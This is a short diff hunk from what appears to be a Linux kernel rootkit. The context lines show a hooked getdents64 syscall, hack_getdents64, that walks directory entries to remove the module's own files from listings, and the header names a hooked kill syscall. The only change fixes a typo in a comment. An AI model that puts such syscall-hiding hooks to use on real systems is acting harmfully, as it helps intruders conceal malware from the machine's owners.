@@ -126,7 +126,7 @@ static asmlinkage long hack_kill(pid_t pid, int sig)
 static asmlinkage long hack_getdents64(const struct pt_regs *regs)
 {
     struct linux_dirent64 *cur = regs->si;  // getting current directory pointer (I think) from the syscalls variables
-    int rtn = orig_getdents64(regs);  // getting the size(or is it legnth?) of the original output from the syscall
+    int rtn = orig_getdents64(regs);  // getting the size(or is it length?) of the original output from the syscall
 
     // Going over every file that was returned and removing our own
     int i = 0;
